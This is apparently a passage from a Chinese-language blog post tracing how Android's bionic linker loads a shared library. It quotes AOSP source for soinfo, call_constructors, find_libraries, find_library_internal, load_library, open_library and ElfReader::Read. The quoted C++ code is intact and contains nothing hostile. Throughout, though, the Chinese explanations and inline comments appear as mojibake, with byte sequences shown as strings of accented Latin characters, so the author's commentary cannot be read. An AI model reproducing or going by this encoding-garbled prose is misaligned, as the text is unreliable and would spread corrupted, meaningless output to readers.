compatibility#endif soinfo* next; uint32_t flags_; const char* strtab_; ElfW(Sym)* symtab_; size_t nbucket_; size_t nchain_; uint32_t* bucket_; uint32_t* chain_;#if !defined(__LP64__) ElfW(Addr)** unused4; // DO NOT USE, maintained for compatibility#endif#if defined(USE_RELA) ElfW(Rela)* plt_rela_; size_t plt_rela_count_; ElfW(Rela)* rela_; size_t rela_count_;#else ElfW(Rel)* plt_rel_; size_t plt_rel_count_; ElfW(Rel)* rel_; size_t rel_count_;#endif linker_ctor_function_t* preinit_array_; size_t preinit_array_count_; linker_ctor_function_t* init_array_; size_t init_array_count_; linker_dtor_function_t* fini_array_; size_t fini_array_count_; linker_ctor_function_t init_func_; linker_dtor_function_t fini_func_;#if defined(__arm__) // ARM EABI section used for stack unwinding. uint32_t* ARM_exidx; size_t ARM_exidx_count;#endif size_t ref_count_; link_map link_map_head; bool constructors_called; // When you read a virtual address from the ELF file, add this // value to get the corresponding address in the process' address space. ElfW(Addr) load_bias;#if !defined(__LP64__) bool has_text_relocations;#endif bool has_DT_SYMBOLIC;&#125;;# call_constructors åœ¨è¿™ä¸ªå‡½æ•°ä¸­ä¼šå…ˆåŠ è½½ init , åœ¨ so ä¸­çš„å‡½æ•°åä¸€èˆ¬ä¸º init_proc , ç„¶ååŠ è½½ init_array ä¸­çš„å‡½æ•° //platform\\bionic\\linker\\linker_soinfo.cppvoid soinfo::call_constructors() &#123; if (constructors_called || g_is_ldd) &#123; return; &#125; // We set constructors_called before actually calling the constructors, otherwise it doesn't // protect against recursive constructor calls. One simple example of constructor recursion // is the libc debug malloc, which is implemented in libc_malloc_debug_leak.so: // 1. The program depends on libc, so libc's constructor is called here. // 2. The libc constructor calls dlopen() to load libc_malloc_debug_leak.so. // 3. dlopen() calls the constructors on the newly created // soinfo for libc_malloc_debug_leak.so. // 4. The debug .so depends on libc, so CallConstructors is // called again with the libc soinfo. If it doesn't trigger the early- // out above, the libc constructor will be called again (recursively!). constructors_called = true; // åœ¨å…±äº«é“¾æ¥åº“ä¸­ä¼šå¿½ç•¥ DT_PREINIT_ARRAY if (!is_main_executable() &amp;&amp; preinit_array_ != nullptr) &#123; // The GNU dynamic linker silently ignores these, but we warn the developer. PRINT(\"\\\"%s\\\": ignoring DT_PREINIT_ARRAY in shared library!\", get_realpath()); &#125; get_children().for_each([] (soinfo* si) &#123; si->call_constructors(); &#125;); if (!is_linker()) &#123; bionic_trace_begin((std::string(\"calling constructors: \") + get_realpath()).c_str()); &#125; // DT_INIT should be called before DT_INIT_ARRAY if both are present. // é¦–å…ˆåŠ è½½ init, åœ¨ so ä¸­çš„å‡½æ•°åä¸€èˆ¬ä¸º init_proc, ç„¶ååŠ è½½ init_array ä¸­çš„å‡½æ•° call_function(\"DT_INIT\", init_func_, get_realpath()); call_array(\"DT_INIT_ARRAY\", init_array_, init_array_count_, false, get_realpath()); if (!is_linker()) &#123; bionic_trace_end(); &#125;&#125;å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨å…±äº«é“¾æ¥åº“ä¸­ pre_initarray ä¼šè¢«å¿½ç•¥æ‰ï¼Œå®ƒåœ¨ call_pre_init_constructors ä¸­ï¼Œä½†å‡å¦‚ä½ ç”¨ ndk-build ç¼–è¯‘ä¸€ä¸ªå¯ä»¥åœ¨ android ä¸Šæ‰§è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªé¢„åˆå§‹åŒ–å‡½æ•°å°±ä¸ä¼šè¢«å¿½ç•¥å•¦ //platform\\bionic\\linker\\linker_soinfo.cppvoid soinfo::call_pre_init_constructors() &#123; if (g_is_ldd) return; // DT_PREINIT_ARRAY functions are called before any other constructors for executables, // but ignored in a shared library. call_array(\"DT_PREINIT_ARRAY\", preinit_array_, preinit_array_count_, false, get_realpath());&#125;# find_library æ¥ä¸‹æ¥åœ¨ find_library ä¸­è°ƒç”¨äº† find_libraries //android-platform\\bionic\\linker\\linker.cppstatic soinfo* find_library(android_namespace_t* ns, const char* name, int rtld_flags, const android_dlextinfo* extinfo, soinfo* needed_by) &#123; soinfo* si = nullptr; // å¦‚æœ name æ˜¯ç©ºçš„ï¼Œåˆ™ä¸º si èµ‹å€¼ä¸º somain //somain: main process, always the one after libdl_info if (name == nullptr) &#123; si = solist_get_somain();// è¿™ä¸ªå‡½æ•°å°†ä¼šè¿”å› somain; &#125; else if (!find_libraries(ns, needed_by, &amp;name, 1, &amp;si, nullptr, 0, rtld_flags, extinfo, false /* add_as_children */)) &#123; if (si != nullptr) &#123; soinfo_unload(si); &#125; return nullptr; &#125; // åŠ è½½ so æˆåŠŸï¼Œso çš„å¼•ç”¨æ¬¡æ•° + 1, å¯¹åº”äº† JavaVMExt::LoadNativeLibrary ä¸­ //so åŠ è½½æ—¶ è¿™ä¸€éƒ¨åˆ†çš„æ³¨é‡Šâ†“ /* Below we dlopen but there is no paired dlclose, this would be necessary if we supported class unloading. Libraries will only be unloaded when the reference count (incremented by dlopen) becomes zero from dlclose. */ si->increment_ref_count(); return si;&#125;# find_libraries åˆ†æäº†è¿™ä¹ˆä¹…ç­‰çš„å°±æ˜¯è¿™ä¸ªå‡½æ•°ï¼ å‡½æ•°å£°æ˜: //android-platform\\bionic\\linker\\linker.cpp/* ns åŠ è½½çš„å‘½åç©ºé—´ = è°ƒç”¨è€…çš„å‘½åç©ºé—´ start_with è°ƒç”¨è€…çš„ soinfo library_names æ‰€æœ‰åŠ è½½åº“åç§° library_names_count åŠ è½½åº“æ•°é‡ soinfos ä¿å­˜åŠ è½½å®Œæˆçš„ soinfo ld_preloads ä¿å­˜é¢„åŠ è½½åº“ï¼Œæ²¡æœ‰å¯ä»¥ä¸º null ld_preloads_count é¢„åŠ è½½åº“æ•°é‡ extinfo Android è°ƒç”¨é™„å¸¦ add_as_children æ˜¯å¦ä½œä¸º start_with çš„å­åº“ search_linked_namespaces æŸ¥è¯¢é“¾æ¥å‘½åç©ºé—´ namespaces é“¾æ¥å‘½åç©ºé—´*/bool find_libraries(android_namespace_t* ns, soinfo* start_with, const char* const library_names[], size_t library_names_count, soinfo* soinfos[], std::vector&lt;soinfo*>* ld_preloads, size_t ld_preloads_count, int rtld_flags, const android_dlextinfo* extinfo, bool add_as_children, std::vector&lt;android_namespace_t*>* namespaces)è¿™ä¸ªå‡½æ•°å¯ä»¥åˆ†ä¸ºä¸ƒä¸ªéƒ¨åˆ†è¿›è¡Œåˆ†æ # å‡†å¤‡é˜¶æ®µ è¿™ä¸€éƒ¨åˆ†å°†å¾…åŠ è½½çš„ so æ·»åŠ åˆ° LoadTaskList åŠ è½½ä»»åŠ¡é˜Ÿåˆ—ä¸­ // Step 0: prepare.std::unordered_map&lt;const soinfo*, ElfReader> readers_map;LoadTaskList load_tasks;// å¯ä»¥åŒæ—¶åŠ è½½å¤šä¸ª so, ä½†ä» find_library ä¼ å…¥çš„å‚æ•°çœ‹æ¥ï¼Œlibrary_names_count// çš„å€¼ä¸º 1, ä¹Ÿå°±æ˜¯è¯´ä»…åŠ è½½ä¸€ä¸ªç›®æ ‡ path çš„ sofor (size_t i = 0; i &lt; library_names_count; ++i) &#123; const char* name = library_names[i]; // å°†è¿™ä¸ª so push åˆ° load_tasks çš„ä»»åŠ¡ä¸­ load_tasks.push_back(LoadTask::create(name, start_with, ns, &amp;readers_map));&#125;// If soinfos array is null allocate one on stack.// The array is needed in case of failure; for example// when library_names[] = &#123;libone.so, libtwo.so&#125; and libone.so// is loaded correctly but libtwo.so failed for some reason.// In this case libone.so should be unloaded on return.// See also implementation of failure_guard below.// ä¸º soinfos åˆ†é…ç©ºé—´if (soinfos == nullptr) &#123; size_t soinfos_size = sizeof(soinfo*)*library_names_count; soinfos = reinterpret_cast&lt;soinfo**>(alloca(soinfos_size)); memset(soinfos, 0, soinfos_size);&#125;// list of libraries to link - see step 2.size_t soinfos_count = 0;auto scope_guard = android::base::make_scope_guard([&amp;]() &#123; for (LoadTask* t : load_tasks) &#123; LoadTask::deleter(t); &#125;&#125;);ZipArchiveCache zip_archive_cache;soinfo_list_t new_global_group_members;# å¯»æ‰¾ä¾èµ–åº“ï¼Œæ·»åŠ åˆ°å¾…åŠ è½½é˜Ÿåˆ— å°†å¾…åŠ è½½çš„ so çš„ä¾èµ–åº“æ·»åŠ åˆ° load_tasks é˜Ÿåˆ—ä¸­ï¼Œæ­¤æ—¶å¹¶ä¸ä¼šåŠ è½½ä¾èµ–åº“ // Step 1: expand the list of load_tasks to include// all DT_NEEDED libraries (do not load them just yet)for (size_t i = 0; i&lt;load_tasks.size(); ++i) &#123; LoadTask* task = load_tasks[i]; soinfo* needed_by = task->get_needed_by(); bool is_dt_needed = needed_by != nullptr &amp;&amp; (needed_by != start_with || add_as_children); task->set_extinfo(is_dt_needed ? nullptr : extinfo); task->set_dt_needed(is_dt_needed); LD_LOG(kLogDlopen, \"find_libraries(ns=%s): task=%s, is_dt_needed=%d\", ns->get_name(), task->get_name(), is_dt_needed); // Note: start from the namespace that is stored in the LoadTask. This namespace // is different from the current namespace when the LoadTask is for a transitive // dependency and the lib that created the LoadTask is not found in the // current namespace but in one of the linked namespace. if (!find_library_internal(const_cast&lt;android_namespace_t*>(task->get_start_from()), task, &amp;zip_archive_cache, &amp;load_tasks, rtld_flags)) &#123; return false; &#125; soinfo* si = task->get_soinfo(); if (is_dt_needed) &#123; needed_by->add_child(si); &#125; // When ld_preloads is not null, the first // ld_preloads_count libs are in fact ld_preloads. bool is_ld_preload = false; if (ld_preloads != nullptr &amp;&amp; soinfos_count &lt; ld_preloads_count) &#123; ld_preloads->push_back(si); is_ld_preload = true; &#125; if (soinfos_count &lt; library_names_count) &#123; soinfos[soinfos_count++] = si; &#125; // Add the new global group members to all initial namespaces. Do this secondary namespace setup // at the same time that libraries are added to their primary namespace so that the order of // global group members is the same in the every namespace. Only add a library to a namespace // once, even if it appears multiple times in the dependency graph. if (is_ld_preload || (si->get_dt_flags_1() &amp; DF_1_GLOBAL) != 0) &#123; if (!si->is_linked() &amp;&amp; namespaces != nullptr &amp;&amp; !new_global_group_members.contains(si)) &#123; new_global_group_members.push_back(si); for (auto linked_ns : *namespaces) &#123; if (si->get_primary_namespace() != linked_ns) &#123; linked_ns->add_soinfo(si); si->add_secondary_namespace(linked_ns); &#125; &#125; &#125; &#125;&#125;è¿™ä¸€æ­¥è¦åšçš„æ˜¯è°ƒç”¨ find_library_internal è·å–åˆ°è¿™ä¸ª so çš„ä¾èµ–åº“ï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯ so çš„ä¾èµ–åº“å‘¢ï¼Ÿæˆ‘ä»¬æ‹¿ ida éšä¾¿åç¼–è¯‘ä¸€ä¸ª so, Needed Library å¼€å¤´çš„å°±æ˜¯è¿™ä¸€ä¸ª so çš„æ‰€æœ‰ä¾èµ–åº“ # find_library_internal è¿™é‡Œåšäº†å››æ¬¡å¯¹äºå¾…åŠ è½½ so çš„ä¾èµ–åº“çš„å¯»æ‰¾ è°ƒç”¨ find_loaded_library_by_soname è¿™ä¸ªåº“æœ‰æ²¡æœ‰è¢«åŠ è½½è¿‡äº†ï¼ŸåŠ è½½è¿‡é‚£ä¹ˆæˆ‘æ‰¾éƒ½ä¸ç”¨æ‰¾äº†ç›´æ¥è¿”å›å¯»æ‰¾ç»“æœ æ­£å¸¸ä½¿ç”¨ load_library æ‰¾ä¾èµ–åº“ æ­£å¸¸å¯»æ‰¾æ‰¾ä¸åˆ°ï¼Œé‚£è¿™ä¸ªåº“æ˜¯ä¸æ˜¯å·²ç»é¢„ç½®åœ¨ç³»ç»Ÿåº“é‡Œé¢äº†ï¼Ÿè¯•è¯•åˆ°å…¨å±€å‘½åç©ºé—´ g_default_namespace é‡Œé¢æ‰¾æ‰¾ å‰ä¸‰ç§æ–¹å¼éƒ½å¤±è´¥äº†ï¼Ÿå¯åŠ¨ç»ˆæè§£å†³æ–¹æ¡ˆï¼Œåˆ°å…±äº«å‘½åç©ºé—´ linked namespace æ‰¾è¿™ä¸ª so çš„ä¾èµ–åº“ï¼Œè¿˜æ²¡æ‰¾åˆ°é‚£å°±æ˜¯çœŸçš„æ‰¾ä¸åˆ°äº† //android-platform\\bionic\\linker\\linker.cppstatic bool find_library_internal(android_namespace_t* ns, LoadTask* task, ZipArchiveCache* zip_archive_cache, LoadTaskList* load_tasks, int rtld_flags) &#123; soinfo* candidate; // å¦‚æœè¿™ä¸ª so å·²ç»è¢«åŠ è½½è¿‡äº†ï¼Œå°±ç›´æ¥ç»™ task è®¾ç½®å®Œ soinfo åè¿”å› if (find_loaded_library_by_soname(ns, task->get_name(), true /* search_linked_namespaces */, &amp;candidate)) &#123; LD_LOG(kLogDlopen, \"find_library_internal(ns=%s, task=%s): Already loaded (by soname): %s\", ns->get_name(), task->get_name(), candidate->get_realpath()); task->set_soinfo(candidate); return true; &#125; // Library might still be loaded, the accurate detection // of this fact is done by load_library. TRACE(\"[ \\\"%s\\\" find_loaded_library_by_soname failed (*candidate=%s@%p). Trying harder... ]\", task->get_name(), candidate == nullptr ? \"n/a\" : candidate->get_realpath(), candidate); // å…³é”®å‡½æ•°ï¼Œç”¨æ¥å¯»æ‰¾ä¾èµ–åº“ if (load_library(ns, task, zip_archive_cache, load_tasks, rtld_flags, true /* search_linked_namespaces */)) &#123; return true; &#125; // TODO(dimitry): workaround for http://b/26394120 (the exempt-list) //exempt lib, å³å·²ç»é¢„ç½®åœ¨ç³»ç»Ÿåº“ä¸­çš„ so, ä¾‹å¦‚ libcrypto.so,libssl.so // ç­‰ç­‰æ¯”è¾ƒè‘—åçš„åº“ï¼Œå‡å¦‚å‘ç°æ˜¯è¿™äº›åº“çš„è¯ï¼Œç”¨é»˜è®¤å‘½åç©ºé—´è·å– soinfo if (ns->is_exempt_list_enabled() &amp;&amp; is_exempt_lib(ns, task->get_name(), task->get_needed_by())) &#123; // For the libs in the exempt-list, switch to the default namespace and then // try the load again from there. The library could be loaded from the // default namespace or from another namespace (e.g. runtime) that is linked // from the default namespace. LD_LOG(kLogDlopen, \"find_library_internal(ns=%s, task=%s): Exempt system library - trying namespace %s\", ns->get_name(), task->get_name(), g_default_namespace.get_name()); ns = &amp;g_default_namespace; if (load_library(ns, task, zip_archive_cache, load_tasks, rtld_flags, true /* search_linked_namespaces */)) &#123; return true; &#125; &#125; // END OF WORKAROUND // if a library was not found - look into linked namespaces // preserve current dlerror in the case it fails. // å‡å¦‚æ‰¾éäº†è‡ªå·±çš„å‘½åç©ºé—´è¿˜æ˜¯æ²¡æ‰¾åˆ°è¿™ä¸ª so çš„ä¾èµ–åº“çš„è¯ï¼Œå°±å»å…±äº«å‘½åç©ºé—´ (linked namespace) // é‡Œé¢å»æ‰¾æ‰¾çœ‹ DlErrorRestorer dlerror_restorer; LD_LOG(kLogDlopen, \"find_library_internal(ns=%s, task=%s): Trying %zu linked namespaces\", ns->get_name(), task->get_name(), ns->linked_namespaces().size()); for (auto&amp; linked_namespace : ns->linked_namespaces()) &#123; if (find_library_in_linked_namespace(linked_namespace, task)) &#123; // Library is already loaded. if (task->get_soinfo() != nullptr) &#123; // n.b. This code path runs when find_library_in_linked_namespace found an already-loaded // library by soname. That should only be possible with a exempt-list lookup, where we // switch the namespace, because otherwise, find_library_in_linked_namespace is duplicating // the soname scan done in this function's first call to find_loaded_library_by_soname. return true; &#125; if (load_library(linked_namespace.linked_namespace(), task, zip_archive_cache, load_tasks, rtld_flags, false /* search_linked_namespaces */)) &#123; LD_LOG(kLogDlopen, \"find_library_internal(ns=%s, task=%s): Found in linked namespace %s\", ns->get_name(), task->get_name(), linked_namespace.linked_namespace()->get_name()); return true; &#125; &#125; &#125; return false;&#125;# load_library å‡½æ•°å£°æ˜: //android-platform\\bionic\\linker\\linker.cppstatic bool load_library(android_namespace_t* ns, LoadTask* task, ZipArchiveCache* zip_archive_cache, LoadTaskList* load_tasks, int rtld_flags, bool search_linked_namespaces);åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œé¦–å…ˆåˆ¤æ–­ extinfo-&gt;flags æ˜¯å¦æ˜¯ ANDROID_DLEXT_USE_LIBRARY_FD , å¦‚æœåŒæ—¶æœ‰ ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET , æ ‡å¿—åœ¨ Android å®˜ç½‘çš„è§£é‡Šå¦‚ä¸‹ é‚£è¿™æ ·å°±æ–¹ä¾¿äº†ï¼Œå‡å¦‚å·²ç»æœ‰äº†è¿™ä¸ª library çš„ fd æ–‡ä»¶æè¿°ç¬¦ï¼Œé‚£ç›´æ¥æ‹¿è¿‡æ¥ç”¨å°±å¯ä»¥äº† ä½†æ˜¯æˆ‘ä»¬å¾…åŠ è½½çš„ so çš„ extinfo-&gt;flags å·²ç»åœ¨ android::OpenNativeLibrary ä¸­è¢«å®šä¹‰ä¸º ANDROID_DLEXT_USE_NAMESPACE äº†ï¼Œè¿™ä¸ªæ ‡å¿—çš„å«ä¹‰åœ¨ä¸Šå›¾ä¸­ä¹Ÿæœ‰ç»™å‡ºï¼Œæ‰€ä»¥å¾ˆé—æ†¾ï¼Œè¿™ä¸ª if è¯­å¥ä¸­çš„ä»£ç å¹¶ä¸ä¼šè¢«æ‰§è¡Œ é‚£ä¹ˆä¸ºä»€ä¹ˆè¦ç‰¹æ„åœ¨æ­¤å¤„åŠ å…¥è¿™ä¸ª if è¯­å¥å‘¢ï¼Ÿ æˆ‘çš„ç†è§£æ˜¯ä¸ºäº†æé«˜è¿è¡Œçš„æ•ˆç‡ï¼Œæœ‰ä¸€äº›åº•å±‚çš„åº“å·²ç»æ‰“å¼€è¿‡ï¼ŒåŠ è½½è¿‡äº†ï¼Œé‚£ä¹ˆå°±å®Œå…¨æ²¡æœ‰å¿…è¦å†æ‰“å¼€ï¼Œæœç´¢ä¸€æ¬¡ï¼Œç›´æ¥æŠŠ library çš„ fd æ–‡ä»¶æè¿°ç¬¦æ‹¿è¿‡æ¥ç”¨å°±å¯ä»¥äº† const char* name = task->get_name();soinfo* needed_by = task->get_needed_by();const android_dlextinfo* extinfo = task->get_extinfo();// å¦‚æœ extinfo->flags çš„æ ‡è®°æ˜¯ ANDROID_DLEXT_USE_LIBRARY_FD, åˆ™ç›´æ¥é€šè¿‡//fd æ–‡ä»¶æè¿°ç¬¦æ¥æ‰“å¼€if (extinfo != nullptr &amp;&amp; (extinfo->flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD) != 0) &#123; off64_t file_offset = 0; if ((extinfo->flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET) != 0) &#123; file_offset = extinfo->library_fd_offset; &#125; std::string realpath; if (!realpath_fd(extinfo->library_fd, &amp;realpath)) &#123; if (!is_first_stage_init()) &#123; PRINT( \"warning: unable to get realpath for the library \\\"%s\\\" by extinfo->library_fd. \" \"Will use given name.\", name); &#125; realpath = name; &#125; task->set_fd(extinfo->library_fd, false); task->set_file_offset(file_offset); return load_library(ns, task, load_tasks, rtld_flags, realpath, search_linked_namespaces);&#125;ä¹‹åï¼Œæˆ‘ä»¬åƒè¾›ä¸‡è‹¦ç»ˆäºçœ‹åˆ°äº†è¿™å¯¹äºå¾…åŠ è½½çš„ so çš„ç¬¬ä¸€ä¸ªæ“ä½œï¼Œè°ƒç”¨ open_library æ‰“å¼€å®ƒ // Open the file.off64_t file_offset;std::string realpath;int fd = open_library(ns, zip_archive_cache, name, needed_by, &amp;file_offset, &amp;realpath);// å¦‚æœæ‰“å¼€ so å¤±è´¥ï¼Œå¯»æ‰¾å¤±è´¥åŸå› if (fd == -1) &#123; if (task->is_dt_needed()) &#123; if (needed_by->is_main_executable()) &#123; DL_OPEN_ERR(\"library \\\"%s\\\" not found: needed by main executable\", name); &#125; else &#123; DL_OPEN_ERR(\"library \\\"%s\\\" not found: needed by %s in namespace %s\", name, needed_by->get_realpath(), task->get_start_from()->get_name()); &#125; &#125; else &#123; DL_OPEN_ERR(\"library \\\"%s\\\" not found\", name); &#125; return false;&#125;//set fd and file_offsettask->set_fd(fd, true);task->set_file_offset(file_offset);æˆ‘ä»¬çŸ¥é“ System.load éœ€è¦æŒ‡å®šå¾…åŠ è½½çš„ so çš„ç»å¯¹è·¯å¾„ï¼Œè¿™åœ¨ open_library ä¸­ä¾¿ç¬¦åˆç¬¬ä¸€ä¸ª if è¯­å¥ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°†ä¼šè°ƒç”¨ open_library_at_path static int open_library(android_namespace_t* ns, ZipArchiveCache* zip_archive_cache, const char* name, soinfo *needed_by, off64_t* file_offset, std::string* realpath) &#123; TRACE(\"[ opening %s from namespace %s ]\", name, ns->get_name()); // If the name contains a slash, we should attempt to open it directly and not search the paths. // æœ‰æ–œæ ï¼Œè¯´æ˜æ˜¯ç»å¯¹è·¯å¾„æ‰“å¼€çš„ if (strchr(name, '/') != nullptr) &#123; return open_library_at_path(zip_archive_cache, name, file_offset, realpath); &#125; // LD_LIBRARY_PATH has the highest priority. We don't have to check accessibility when searching // the namespace's path lists, because anything found on a namespace path list should always be // accessible. int fd = open_library_on_paths(zip_archive_cache, name, file_offset, ns->get_ld_library_paths(), realpath); // Try the DT_RUNPATH, and verify that the library is accessible. if (fd == -1 &amp;&amp; needed_by != nullptr) &#123; fd = open_library_on_paths(zip_archive_cache, name, file_offset, needed_by->get_dt_runpath(), realpath); if (fd != -1 &amp;&amp; !ns->is_accessible(*realpath)) &#123; close(fd); fd = -1; &#125; &#125; // Finally search the namespace's main search path list. if (fd == -1) &#123; fd = open_library_on_paths(zip_archive_cache, name, file_offset, ns->get_default_library_paths(), realpath); &#125; return fd;&#125;åœ¨ open_library_at_path ä¸­æ‰ç®—æ˜¯çœŸæ­£çš„ä½¿ç”¨ open å‡½æ•°æ‰“å¼€äº†è¿™ä¸ª so, å¹¶è¿”å›æ–‡ä»¶æè¿°ç¬¦ fd , ä¼ å…¥çš„ä¸¤ä¸ªæ ‡å¿—çš„å«ä¹‰åˆ†åˆ«ä¸º O_RDONLY è¡¨ç¤ºä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚ O_CLOEXEC è¡¨ç¤ºåœ¨ exec æ—å‡½æ•° (execl, execlp, execle, execv, execvp, execvpe) è°ƒç”¨åï¼Œå°†è‡ªåŠ¨å…³é—­æ–‡ä»¶æè¿°ç¬¦ static int open_library_at_path(ZipArchiveCache* zip_archive_cache, const char* path, off64_t* file_offset, std::string* realpath) &#123; int fd = -1; // å¦‚æœè·¯å¾„ä¸­åŒ…å« \"!/\", åˆ™é€šè¿‡ zipfile æ‰“å¼€åº“ if (strstr(path, kZipFileSeparator) != nullptr) &#123; fd = open_library_in_zipfile(zip_archive_cache, path, file_offset, realpath); &#125; if (fd == -1) &#123; fd = TEMP_FAILURE_RETRY(open(path, O_RDONLY | O_CLOEXEC)); if (fd != -1) &#123; *file_offset = 0; if (!realpath_fd(fd, realpath)) &#123; if (!is_first_stage_init()) &#123; PRINT(\"warning: unable to get realpath for the library \\\"%s\\\". Will use given path.\", path); &#125; *realpath = path; &#125; &#125; &#125; return fd;&#125;æˆåŠŸçš„æ‰“å¼€äº†è¿™ä¸ª so ä¹‹åï¼Œé‚£å°±è¦å¼€å§‹è§£æè¿™ä¸ª so å’¯ï¼Œçœ‹çœ‹ load_library æœ€ç»ˆ return çš„å•¥ï¼Ÿç«Ÿç„¶è¿˜æ˜¯ load_library ! ä¸è¿‡ç»†çœ‹ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œæ€ä¹ˆæ„Ÿè§‰ç±»å‹ä¸æ˜¯ ZipArchiveCache* å‘¢ return load_library(ns, task, load_tasks, rtld_flags, realpath, search_linked_namespaces);æ‰¾æ‰¾å‡½æ•°çš„å£°æ˜ï¼ŒåŸæ¥ load_library è¿˜æœ‰ä¸€ä¸ªé‡è½½å‡½æ•°ï¼Œå®ƒçš„ç¬¬ä¸‰ä¸ªå‚æ•°çš„ç±»å‹å°±æ˜¯ LoadTaskList* æ­¤ load_library å‡½æ•°çš„å®Œæ•´ä»£ç å¦‚ä¸‹ //android-platform\\bionic\\linker\\linker.cppstatic bool load_library(android_namespace_t* ns, LoadTask* task, ZipArchiveCache* zip_archive_cache, LoadTaskList* load_tasks, int rtld_flags, bool search_linked_namespaces) &#123; const char* name = task->get_name(); soinfo* needed_by = task->get_needed_by(); const android_dlextinfo* extinfo = task->get_extinfo(); // å¦‚æœ extinfo->flags çš„æ ‡è®°æ˜¯ ANDROID_DLEXT_USE_LIBRARY_FD, åˆ™ç›´æ¥é€šè¿‡ //fd æ–‡ä»¶æè¿°ç¬¦æ¥æ‰“å¼€ if (extinfo != nullptr &amp;&amp; (extinfo->flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD) != 0) &#123; off64_t file_offset = 0; if ((extinfo->flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET) != 0) &#123; file_offset = extinfo->library_fd_offset; &#125; std::string realpath; if (!realpath_fd(extinfo->library_fd, &amp;realpath)) &#123; if (!is_first_stage_init()) &#123; PRINT( \"warning: unable to get realpath for the library \\\"%s\\\" by extinfo->library_fd. \" \"Will use given name.\", name); &#125; realpath = name; &#125; task->set_fd(extinfo->library_fd, false); task->set_file_offset(file_offset); return load_library(ns, task, load_tasks, rtld_flags, realpath, search_linked_namespaces); &#125; LD_LOG(kLogDlopen, \"load_library(ns=%s, task=%s, flags=0x%x, search_linked_namespaces=%d): calling \" \"open_library\", ns->get_name(), name, rtld_flags, search_linked_namespaces); // Open the file. off64_t file_offset; std::string realpath; int fd = open_library(ns, zip_archive_cache, name, needed_by, &amp;file_offset, &amp;realpath); // å¦‚æœæ‰“å¼€ so å¤±è´¥ï¼Œå¯»æ‰¾å¤±è´¥åŸå›  if (fd == -1) &#123; if (task->is_dt_needed()) &#123; if (needed_by->is_main_executable()) &#123; DL_OPEN_ERR(\"library \\\"%s\\\" not found: needed by main executable\", name); &#125; else &#123; DL_OPEN_ERR(\"library \\\"%s\\\" not found: needed by %s in namespace %s\", name, needed_by->get_realpath(), task->get_start_from()->get_name()); &#125; &#125; else &#123; DL_OPEN_ERR(\"library \\\"%s\\\" not found\", name); &#125; return false; &#125; //set fd and file_offset task->set_fd(fd, true); task->set_file_offset(file_offset); return load_library(ns, task, load_tasks, rtld_flags, realpath, search_linked_namespaces);&#125;# é‡è½½çš„ load_library å‡½æ•°å£°æ˜: //android-platform\\bionic\\linker\\linker.cppstatic bool load_library(android_namespace_t* ns, LoadTask* task, LoadTaskList* load_tasks, int rtld_flags, const std::string&amp; realpath, bool search_linked_namespaces);è¿™ä¸ªå‡½æ•°çš„å¼€å¤´åšäº†ä¸€å¤§å †å‚æ•°åˆæ³•æ€§çš„æ£€æŸ¥ï¼Œéšåç»ˆäºå¼€å§‹è§£æ so äº†ï¼Œå…¶å…³é”®å‡½æ•°ä¸º task-&gt;read(realpath.c_str(), file_stat.st_size) soinfo* si = soinfo_alloc(ns, realpath.c_str(), &amp;file_stat, file_offset, rtld_flags);task->set_soinfo(si);// Read the ELF header and some of the segments.if (!task->read(realpath.c_str(), file_stat.st_size)) &#123; task->remove_cached_elf_reader(); task->set_soinfo(nullptr); soinfo_free(si); return false;&#125;// Find and set DT_RUNPATH, DT_SONAME, and DT_FLAGS_1.// Note that these field values are temporary and are// going to be overwritten on soinfo::prelink_image// with values from PT_LOAD segments.const ElfReader&amp; elf_reader = task->get_elf_reader();for (const ElfW(Dyn)* d = elf_reader.dynamic(); d->d_tag != DT_NULL; ++d) &#123; if (d->d_tag == DT_RUNPATH) &#123; si->set_dt_runpath(elf_reader.get_string(d->d_un.d_val)); &#125; if (d->d_tag == DT_SONAME) &#123; si->set_soname(elf_reader.get_string(d->d_un.d_val)); &#125; // We need to identify a DF_1_GLOBAL library early so we can link it to namespaces. if (d->d_tag == DT_FLAGS_1) &#123; si->set_dt_flags_1(d->d_un.d_val); &#125;&#125;for_each_dt_needed(task->get_elf_reader(), [&amp;](const char* name) &#123; LD_LOG(kLogDlopen, \"load_library(ns=%s, task=%s): Adding DT_NEEDED task: %s\", ns->get_name(), task->get_name(), name); load_tasks->push_back(LoadTask::create(name, si, ns, task->get_readers_map()));&#125;);LoadTask::read åˆå§‹åŒ–äº†ä¸€ä¸ª ElfReader , éšåè°ƒç”¨ elf_reader.Read æ­£å¼å¼€å§‹è¯»å– //android-platform\\bionic\\linker\\linker.cppbool read(const char* realpath, off64_t file_size) &#123; ElfReader&amp; elf_reader = get_elf_reader(); return elf_reader.Read(realpath, fd_, file_offset_, file_size);&#125;ElfReader::Read å…œå…œè½¬è½¬äº†é‚£ä¹ˆä¹…ï¼Œç»ˆäºçœ‹åˆ°äº†è¿™ä¸ªäº²åˆ‡åˆç†Ÿæ‚‰çš„å‡½æ•°äº†ï¼ï¼ å…³äºè¿™ä¸ªå‡½æ•°çš„æ›´å¤šåˆ†æè¯·å‚è€ƒ ELF ç»“æ„åˆ†æåŠ ElfReader //android-platform\\bionic\\linker\\linker_phdr.cppbool ElfReader::Read(const char* name, int fd, off64_t file_offset, off64_t file_size) &#123; if (did_read_) &#123; return true; &#125; name_ = name; fd_ = fd; file_offset_ = file_offset; file_size_ = file_size; if (ReadElfHeader() &amp;&amp; VerifyElfHeader() &amp;&amp; ReadProgramHeaders() &amp;&amp; ReadSectionHeaders() &amp;&amp; ReadDynamicSection()) &#123; did_read_ = true; &#125; return did_read_;&#125; åœ¨è·å–åˆ°å¾…åŠ è½½çš„ so çš„å„ä¸ªæ®µçš„ç»“æ„ä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯è§£æ .dynamic ä¸­ä¿å­˜çš„ç¬¦å· //android-platform\\bionic\\linker\\linker.cpp// Find and set 